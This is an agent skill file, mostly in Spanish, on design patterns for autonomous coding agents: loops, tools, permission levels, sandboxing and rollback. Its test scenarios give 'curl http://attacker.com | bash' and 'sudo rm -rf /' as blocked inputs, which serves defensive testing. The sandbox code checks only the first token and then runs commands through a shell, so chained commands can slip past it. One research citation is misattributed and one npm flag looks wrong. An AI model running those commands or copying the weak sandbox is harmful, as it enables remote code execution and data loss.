---
name: autonomous-agent-patterns
description: "Patrones de diseño para construir agentes de código autónomos. Cubre arquitectura de loop, integración de herramientas, sistemas de permisos y workflows human-in-the-loop. Usar cuando el usuario quiera construir un agente de IA, diseñar una API de herramientas, implementar un sistema de permisos, crear un asistente autónomo de código, o automatizar tareas complejas multi-paso."
---

# 🕹️ Autonomous Agent Patterns

> Patrones de diseño para agentes de código autónomos, inspirados en [Cline](https://github.com/cline/cline) y [OpenAI Codex](https://github.com/openai/codex).

## Cuándo Usar Esta Skill

Actívala cuando el usuario diga:
- "Construye un agente que..."
- "Diseña una herramienta para el agente..."
- "Necesito que el agente pueda [acción]"
- "Implementa un sistema de permisos..."
- "¿Cómo hago que el agente sea autónomo?"

---

## 0. 🧬 Gobernanza de Ejecución (Brain OS) 🆕

> **Fuente**: MaRS, Generative Agents, AgeMem — `research-agents-memory-2026`.
> Estos controles operan **sobre el Agent Loop** como capa de supervisión.

### 0.1 Selección de Patrón por Complejidad Estimada

Antes de iniciar cualquier tarea multi-paso, evaluar el número de pasos necesarios:

| Pasos Estimados | Patrón | Características |
|:---:|---|---|
| **< 5** | Sequential (Agente único) | Flujo lineal, sin overhead de coordinación |
| **5–15** | Coordinator-Worker | Un orquestador delega a workers especializados |
| **> 15** | Swarm / Jerárquico | Red de agentes con estado compartido y coordinación explícita |

> ⚠️ **Anti-Sobreingeniería**: No usar Swarm si 1 agente + buen prompt puede resolver la tarea. Jerarquías prematuras incrementan latencia y costo sin beneficio. (Anthropic, 2025)

### 0.2 Protocolo Anti-Loop 🆕

> **Fuente**: MaRS research (2024). Random Drop como regularizador surge del propio estudio de MaRS.

El agente DEBE monitorear activamente si está en un bucle de razonamiento:

```
VENTANA DE DETECCIÓN: últimos N pasos (N = MEMORY_GOVERNANCE.loop_detection_window, default: 5)

SEÑAL DE LOOP:
  → Misma herramienta invocada con argumentos similares, sin avance
  → Misma pregunta hecha al usuario >2 veces en 5 turnos
  → Resultado de la herramienta es siempre un error del mismo tipo

AL DETECTAR LOOP:
  PASO 1 — Trigger de Reflexión: Anunciar explícitamente: "Detecto un patrón repetitivo (loop). Pausando para re-evaluar."
  PASO 2 — Random Drop (regularizador): Descartar 1 fragmento de contexto del hilo activo al azar.
             (Paradójicamente eficaz: previene que el agente refuerce el path erróneo)
  PASO 3 — Cambio de estrategia: Intentar un camino alternativo diferente al anterior.
  PASO 4 — Si el loop persiste tras 2 intentos: escalar al usuario con el contexto del bloqueo.

LÍMITE HARD: max_execution_steps = 20 (ver MEMORY_GOVERNANCE en brain_config.md)
```

### 0.3 Trigger de Reflexión Periódica

> **Fuente**: Generative Agents (MIT, 2024) — reflexión activa previene la degradación a largo plazo.

```
TRIGGER DE REFLEXIÓN (cada vez que importance_score acumulado > 150):
  PASO 1 → Consolidar los últimos N episodios en una reflexión de alto nivel:
            "¿Qué patterns detecté en esta sesión? ¿Qué funciona / qué no?"
  PASO 2 → Guardar la reflexión en sesiones/{date}/reflections.md
  PASO 3 → Reiniciar el contador de importancia.
  PASO 4 → Continuar con el contexto ligeramente reducido y más coherente.

NOTA: importance_score no es una variable literal; el agente estima cuándo ha procesado
      suficiente información compleja para requerir consolidación (típico: ~2-3x por sesión larga).
```

---

## 1. Core Agent Architecture

### 1.1 Agent Loop

```
┌─────────────────────────────────────────────────────────────┐
│                     AGENT LOOP                               │
│                                                              │
│  ┌──────────┐    ┌──────────┐    ┌──────────┐              │
│  │  Think   │───▶│  Decide  │───▶│   Act    │              │
│  │ (Reason) │    │ (Plan)   │    │ (Execute)│              │
│  └──────────┘    └──────────┘    └──────────┘              │
│       ▲                               │                     │
│       │         ┌──────────┐          │                     │
│       └─────────│ Observe  │◀─────────┘                     │
│                 │ (Result) │                                │
│                 └──────────┘                                │
└─────────────────────────────────────────────────────────────┘
```

```python
class AgentLoop:
    def __init__(self, llm, tools: list, max_iterations: int = 50):
        self.llm = llm
        self.tools = {t.name: t for t in tools}
        self.max_iterations = max_iterations
        self.history = []

    def run(self, task: str) -> str:
        self.history.append({"role": "user", "content": task})

        for i in range(self.max_iterations):
            response = self.llm.chat(
                messages=self.history,
                tools=self._format_tools(),
                tool_choice="auto"
            )

            if response.tool_calls:
                for tool_call in response.tool_calls:
                    result = self._execute_tool(tool_call)
                    self.history.append({
                        "role": "tool",
                        "tool_call_id": tool_call.id,
                        "content": str(result)
                    })
            else:
                return response.content  # Task complete

        return "Max iterations reached — task incomplete"

    def _execute_tool(self, tool_call) -> Any:
        tool = self.tools.get(tool_call.name)
        if not tool:
            return ToolResult(success=False, error=f"Tool not found: {tool_call.name}")
        args = json.loads(tool_call.arguments)
        return tool.execute(**args)
```

### 1.2 Multi-Model Architecture

```python
class MultiModelAgent:
    """
    Asigna modelos según el tipo de tarea para optimizar costo/rendimiento.
    Adaptar los nombres de modelos al stack real del proyecto.
    """

    def __init__(self, model_config: dict):
        # Pasar desde config, no hardcodear aquí
        self.models = model_config  # {"fast": "...", "smart": "...", "code": "..."}

    def select_model(self, task_type: str) -> str:
        mapping = {
            "planning": "fast",
            "analysis": "smart",
            "code": "code"
        }
        key = mapping.get(task_type, "smart")
        return self.models[key]
```

---

## 2. Tool Design Patterns

### 2.1 Tool Schema Base

```python
class Tool:
    """Base class para todas las herramientas del agente"""

    @property
    def schema(self) -> dict:
        return {
            "name": self.name,
            "description": self.description,
            "parameters": {
                "type": "object",
                "properties": self._get_parameters(),
                "required": self._get_required()
            }
        }

    def execute(self, **kwargs) -> "ToolResult":
        raise NotImplementedError


class ReadFileTool(Tool):
    name = "read_file"
    description = "Read the contents of a file from the filesystem"

    def _get_parameters(self):
        return {
            "path": {"type": "string", "description": "Absolute path to the file"},
            "start_line": {"type": "integer", "description": "Line to start reading from (1-indexed)"},
            "end_line": {"type": "integer", "description": "Line to stop reading at (inclusive)"}
        }

    def _get_required(self):
        return ["path"]

    def execute(self, path: str, start_line: int = None, end_line: int = None) -> "ToolResult":
        try:
            with open(path, 'r', encoding='utf-8') as f:
                lines = f.readlines()

            if start_line and end_line:
                lines = lines[start_line - 1:end_line]

            return ToolResult(success=True, output="".join(lines))
        except FileNotFoundError:
            return ToolResult(success=False, error=f"File not found: {path}")
        except PermissionError:
            return ToolResult(success=False, error=f"Permission denied: {path}")
```

### 2.2 Essential Agent Tools

```python
CODING_AGENT_TOOLS = {
    # File operations
    "read_file":       "Read file contents",
    "write_file":      "Create or overwrite a file",
    "edit_file":       "Make targeted edits to a file",
    "list_directory":  "List files and folders",
    "search_files":    "Search for files by pattern",

    # Code understanding
    "search_code":     "Search for code patterns (grep)",
    "get_definition":  "Find function/class definition",

    # Terminal
    "run_command":     "Execute a shell command",
    "read_output":     "Read command output",

    # Context
    "ask_user":        "Ask the user a question",
    "search_web":      "Search the web for information"
}
```

### 2.3 Edit Tool con Conflict Detection

```python
class EditFileTool(Tool):
    """
    Precise file editing with conflict detection.
    Uses search/replace pattern for reliable edits.
    """

    name = "edit_file"
    description = "Edit a file by replacing specific content"

    def execute(
        self,
        path: str,
        search: str,
        replace: str,
        expected_occurrences: int = 1
    ) -> "ToolResult":
        try:
            with open(path, 'r', encoding='utf-8') as f:
                content = f.read()

            actual_occurrences = content.count(search)

            if actual_occurrences == 0:
                return ToolResult(success=False, error="Search text not found in file")

            if actual_occurrences != expected_occurrences:
                return ToolResult(
                    success=False,
                    error=f"Expected {expected_occurrences} occurrences, found {actual_occurrences}"
                )

            new_content = content.replace(search, replace)

            with open(path, 'w', encoding='utf-8') as f:
                f.write(new_content)

            return ToolResult(success=True, output=f"Replaced {actual_occurrences} occurrence(s)")

        except (FileNotFoundError, PermissionError) as e:
            return ToolResult(success=False, error=str(e))
```

---

## 3. Permission & Safety Patterns

### 3.1 Permission Levels

```python
class PermissionLevel(Enum):
    AUTO     = "auto"      # Fully automatic — no user approval
    ASK_ONCE = "ask_once"  # Ask once per session
    ASK_EACH = "ask_each"  # Ask every time
    NEVER    = "never"     # Never allow

PERMISSION_CONFIG = {
    # Low risk
    "read_file":       PermissionLevel.AUTO,
    "list_directory":  PermissionLevel.AUTO,
    "search_code":     PermissionLevel.AUTO,

    # Medium risk
    "write_file":      PermissionLevel.ASK_ONCE,
    "edit_file":       PermissionLevel.ASK_ONCE,

    # High risk
    "run_command":     PermissionLevel.ASK_EACH,
    "delete_file":     PermissionLevel.ASK_EACH,

    # Dangerous
    "sudo_command":    PermissionLevel.NEVER,
    "format_disk":     PermissionLevel.NEVER
}
```

### 3.2 Approval Manager

```python
class ApprovalManager:
    def __init__(self, ui, config: dict):
        self.ui = ui
        self.config = config
        self.session_approvals = {}

    def request_approval(self, tool_name: str, args: dict) -> bool:
        level = self.config.get(tool_name, PermissionLevel.ASK_EACH)

        if level == PermissionLevel.AUTO:
            return True
        if level == PermissionLevel.NEVER:
            self.ui.show_error(f"Tool '{tool_name}' is not allowed")
            return False
        if level == PermissionLevel.ASK_ONCE and tool_name in self.session_approvals:
            return self.session_approvals[tool_name]

        approved = self.ui.show_approval_dialog(
            tool=tool_name,
            args=args,
            risk_level=self._assess_risk(tool_name, args)
        )

        if level == PermissionLevel.ASK_ONCE:
            self.session_approvals[tool_name] = approved

        return approved

    def _assess_risk(self, tool_name: str, args: dict) -> str:
        if tool_name == "run_command":
            cmd = args.get("command", "")
            if any(danger in cmd for danger in ["rm -rf", "sudo", "chmod", "format"]):
                return "HIGH"
        return "MEDIUM"
```

### 3.3 Sandboxing

```python
class SandboxedExecution:
    def __init__(self, workspace_dir: str):
        self.workspace = workspace_dir
        self.allowed_commands = ["npm", "python", "node", "git", "ls", "cat", "pip"]
        self.blocked_paths = ["/etc", "/usr", "/bin"]

    def validate_path(self, path: str) -> bool:
        """Previene path traversal — el path debe estar dentro del workspace"""
        real_path = os.path.realpath(path)
        workspace_real = os.path.realpath(self.workspace)
        return real_path.startswith(workspace_real)

    def validate_command(self, command: str) -> bool:
        cmd_parts = shlex.split(command)
        if not cmd_parts:
            return False
        return cmd_parts[0] in self.allowed_commands

    def execute_sandboxed(self, command: str) -> "ToolResult":
        if not self.validate_command(command):
            return ToolResult(success=False, error=f"Command not allowed: {command}")

        try:
            result = subprocess.run(
                command, shell=True, cwd=self.workspace,
                capture_output=True, timeout=30,
                env={**os.environ, "HOME": self.workspace}
            )
            return ToolResult(
                success=result.returncode == 0,
                output=result.stdout.decode(),
                error=result.stderr.decode() if result.returncode != 0 else None
            )
        except subprocess.TimeoutExpired:
            return ToolResult(success=False, error="Command timed out after 30s")
```

---

## 4. Context Management

### 4.1 Context Injection Patterns

```python
class ContextManager:
    """
    Manage context provided to the agent.
    Inspired by Cline's @-mention patterns.
    """

    def __init__(self, workspace: str):
        self.workspace = workspace
        self.context = []

    def add_file(self, path: str) -> None:
        """@file — Add file contents to context"""
        with open(path, 'r', encoding='utf-8') as f:
            content = f.read()
        self.context.append({"type": "file", "path": path, "content": content})

    def add_folder(self, path: str, max_files: int = 20) -> None:
        """@folder — Add all files in folder"""
        for root, dirs, files in os.walk(path):
            for file in files[:max_files]:
                self.add_file(os.path.join(root, file))

    def add_url(self, url: str) -> None:
        """@url — Fetch and add URL content"""
        response = requests.get(url, timeout=10)
        content = html_to_markdown(response.text)
        self.context.append({"type": "url", "url": url, "content": content})

    def format_for_prompt(self) -> str:
        parts = []
        for item in self.context:
            if item["type"] == "file":
                parts.append(f"## File: {item['path']}\n```\n{item['content']}\n```")
            elif item["type"] == "url":
                parts.append(f"## URL: {item['url']}\n{item['content']}")
        return "\n\n".join(parts)
```

### 4.2 Checkpoint/Resume

```python
class CheckpointManager:
    """Save and restore agent state for long-running tasks."""

    def __init__(self, storage_dir: str):
        self.storage_dir = storage_dir
        os.makedirs(storage_dir, exist_ok=True)

    def save_checkpoint(self, session_id: str, state: dict) -> str:
        checkpoint = {
            "timestamp": datetime.now().isoformat(),
            "session_id": session_id,
            "history": state["history"],
            "context": state["context"],
            "workspace_state": self._capture_workspace(state["workspace"]),
            "metadata": state.get("metadata", {})
        }
        path = os.path.join(self.storage_dir, f"{session_id}.json")
        with open(path, 'w') as f:
            json.dump(checkpoint, f, indent=2)
        return path

    def restore_checkpoint(self, checkpoint_path: str) -> dict:
        with open(checkpoint_path, 'r') as f:
            return json.load(f)

    def _capture_workspace(self, workspace: str) -> dict:
        return {
            "git_ref": subprocess.getoutput(f"cd {workspace} && git rev-parse HEAD"),
            "git_dirty": subprocess.getoutput(f"cd {workspace} && git status --porcelain")
        }
```

---

## 5. ⚠️ Rollback y Recuperación de Errores

> Esta sección define el **comportamiento operativo** del agente frente a fallos — no es solo referencia.

### 5.1 Protocolo de Pre-Acción para Operaciones Riesgosas

**Antes de ejecutar cualquier operación destructiva** (write, edit, delete, run_command), el agente DEBE:

```
1. Verificar si hay un checkpoint activo → Si no, crear uno
2. Para edición de archivos: leer y guardar el contenido original en memoria
3. Informar al usuario: "Voy a modificar [X]. Puedo revertir si algo falla."
4. Ejecutar la operación
5. Si falla → ejecutar rollback inmediato (ver 5.2)
```

### 5.2 Estrategia de Rollback por Tipo de Herramienta

| Herramienta | Rollback |
|-------------|---------|
| `write_file` | Guardar contenido previo antes de escribir; si falla, restaurar |
| `edit_file` | Guardar `search` original; si el resultado es incorrecto, reemplazar `replace` → `search` |
| `run_command` | Log del comando ejecutado; ofrecer comando inverso si existe (ej: `npm install` → `npm ci --reinstall`) |
| `delete_file` | Mover a directorio temporal, NO eliminar permanente hasta confirmación |

### 5.3 ¿Qué Hacer Cuando una Herramienta Falla?

```
SI ToolResult.success == False:

  CASO 1 — Error transient (timeout, conexión):
    → Retry hasta 2 veces con backoff exponencial (1s, 3s)
    → Si persiste: informar al usuario con el error exacto

  CASO 2 — Error de validación (archivo no encontrado, permiso denegado):
    → NO reintentar — el problema es estructural
    → Informar: "No pude [acción] porque [razón]. ¿Quieres que [alternativa]?"

  CASO 3 — Error de lógica (resultado inesperado):
    → Ejecutar rollback del paso actual
    → Re-planificar: ¿hay un camino alternativo?
    → Si no hay alternativa clara: preguntar al usuario antes de continuar
```

---

## 6. Recursos

- [Cline](https://github.com/cline/cline)
- [OpenAI Codex](https://github.com/openai/codex)
- [references/browser-automation.md](references/browser-automation.md) — Automatización web con Playwright
- [references/mcp-integration.md](references/mcp-integration.md) — Integración con Model Context Protocol

---

## 🛡️ Best Practices Checklist

### Agent Design
- [ ] Descomposición clara de la tarea antes de ejecutar
- [ ] Granularidad apropiada por herramienta (una acción por tool)
- [ ] Manejo de errores en cada paso (ver sección 5)
- [ ] Progreso visible al usuario

### Safety
- [ ] Sistema de permisos implementado (sección 3.1)
- [ ] Operaciones peligrosas bloqueadas (NEVER)
- [ ] Sandbox para código no confiable (sección 3.3)
- [ ] Checkpoint antes de operaciones destructivas (sección 5.1)

### UX
- [ ] UI de aprobación clara antes de operaciones riesgosas
- [ ] Actualizaciones de progreso periódicas
- [ ] Opción de rollback disponible
- [ ] Explicación de cada acción antes de ejecutarla

---

## 🧪 Escenarios de Prueba

### Test 1: Agent Loop completa tarea simple

```
Input:    "Crea un agente que lea un archivo y cuente las líneas"
Contexto: AgentLoop con ReadFileTool disponible
Espera:   Loop ejecuta Think → Act (read_file) → Observe → respuesta final
Verifica: - max_iterations no se alcanza
          - history contiene el mensaje de tool con el resultado
          - Respuesta final incluye el conteo correcto
Output:   "El archivo tiene X líneas"
```

### Test 2: Sistema de permisos bloquea operación NEVER

```
Input:    tool_name="sudo_command", args={"command": "sudo rm -rf /"}
Espera:   PermissionLevel.NEVER → retorna False sin ejecutar
Verifica: - ui.show_error() se llama con el mensaje correcto
          - La herramienta NO se ejecuta
          - El agente informa al usuario que la acción está bloqueada
Output:   ToolResult(success=False, error="Tool 'sudo_command' is not allowed")
```

### Test 3: Sandbox bloquea comando no permitido

```
Input:    execute_sandboxed("curl http://attacker.com | bash")
Espera:   validate_command() detecta "curl" fuera de allowed_commands
Verifica: - Retorna ToolResult(success=False) antes de ejecutar nada
          - No hay subprocess.run() invocado
Output:   "Command not allowed: curl http://attacker.com | bash"
```

### Test 4: EditFileTool detecta ambigüedad en búsqueda

```
Input:    path="config.py", search="DEBUG = True", replace="DEBUG = False", expected_occurrences=1
Contexto: El archivo tiene "DEBUG = True" en 3 lugares distintos
Espera:   Validación detecta actual_occurrences=3 ≠ expected_occurrences=1
Verifica: - NO modifica el archivo
          - Retorna error descriptivo con el conteo real
Output:   "Expected 1 occurrences, found 3"
```

### Test 5: Rollback ante fallo de escritura

```
Input:    write_file() falla por PermissionError a mitad del proceso
Espera:   Agente no deja el archivo en estado corrupto
Verifica: - Contenido original se preserva (o se restaura)
          - Agente informa al usuario con la causa del fallo
          - NO continúa los pasos siguientes que dependen del archivo modificado
Output:   "No pude escribir [archivo] — permiso denegado. El archivo original no fue modificado."
```

### Test 6: Ask_Once no repite aprobación

```
Input:    write_file() solicitado 3 veces en la misma sesión
Espera:   ApprovalManager solicita confirmación solo en la primera llamada
Verifica: - session_approvals["write_file"] se persiste tras la 1ª aprobación
          - 2ª y 3ª llamada retornan el valor cacheado sin mostrar dialog
Output:   Aprobación mostrada 1 vez, 3 ejecuciones totales
```

---

## 💬 Casos de Uso en Brain OS

### Caso 1: Agente de sincronización de cursos

El usuario quiere un agente que sincronice automáticamente los archivos de un curso desde el Aula Virtual a su carpeta local.

**Cómo se aplican los patrones:**
1. `AgentLoop` orquesta: detectar archivos nuevos → descargar → registrar en Notion
2. `SandboxedExecution` ejecuta solo comandos `python` del script de descarga
3. `PermissionConfig`: descargar = `ASK_ONCE`, eliminar duplicados = `ASK_EACH`
4. `CheckpointManager` guarda el estado de sincronización — si falla a mitad, retoma desde el último archivo descargado
5. Si `ToolResult.success=False` en descarga: reintentar 2x, luego saltar ese archivo y continuar con el resto

### Caso 2: Agente de refactoring de código

El usuario quiere refactorizar una función renombrando todas sus referencias en el proyecto.

**Cómo se aplican los patrones:**
1. `ContextManager.add_folder()` carga el proyecto completo al contexto
2. `EditFileTool` con `expected_occurrences` para cada archivo — si hay más referencias de las esperadas, pausa y consulta al usuario
3. Protocolo 5.1: checkpoint antes de iniciar, contenido guardado por archivo
4. Si algún `ToolResult.success=False` (ej: archivo bloqueado por el IDE): se registra como pendiente, NO se aborta el proceso completo
5. Al finalizar: reporte de archivos modificados vs pendientes
